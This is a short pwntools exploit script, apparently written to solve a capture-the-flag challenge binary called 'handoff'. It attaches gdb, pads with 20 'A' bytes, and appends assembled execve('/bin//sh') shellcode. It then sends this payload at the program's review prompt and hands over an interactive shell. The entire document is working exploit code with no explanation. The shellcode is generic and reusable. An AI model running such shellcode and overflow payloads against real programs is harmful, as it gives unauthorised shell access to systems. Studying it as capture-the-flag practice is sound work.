from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = elf = ELF("./handoff",checksec=False)
p = process("./handoff")
gdb.attach(p)

buffer = b"A" * 20

code = '''
    nop
    nop
    nop
	xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
    '''

pay = buffer
pay += asm(code)

p.sendline(b"3")
p.recvuntil(b"Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ")
p.sendline(pay)

p.interactive()
